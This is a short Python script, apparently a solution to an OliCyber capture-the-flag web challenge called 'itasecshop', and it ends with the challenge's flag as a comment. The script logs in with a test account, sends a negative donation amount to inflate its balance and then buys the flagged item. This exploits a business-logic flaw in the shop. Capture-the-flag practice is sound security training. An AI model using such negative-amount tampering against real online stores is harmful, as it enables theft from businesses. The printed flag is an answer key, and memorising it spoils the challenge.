import requests

s = requests.session()

site = "http://itasecshop.challs.olicyber.it"

data = {
    "user" : "testytest",
    "psw" : "testytest"
}

login = s.post(f"{site}/login", data=data)

donate = s.post(f"{site}/store/donate", data = {"price" : "-1000000000"})

flag = s.post(f"{site}/store/1/buy").text

print(flag)

#ITASEC{it_4as_A_th3ft_not_a_D0nat10n!}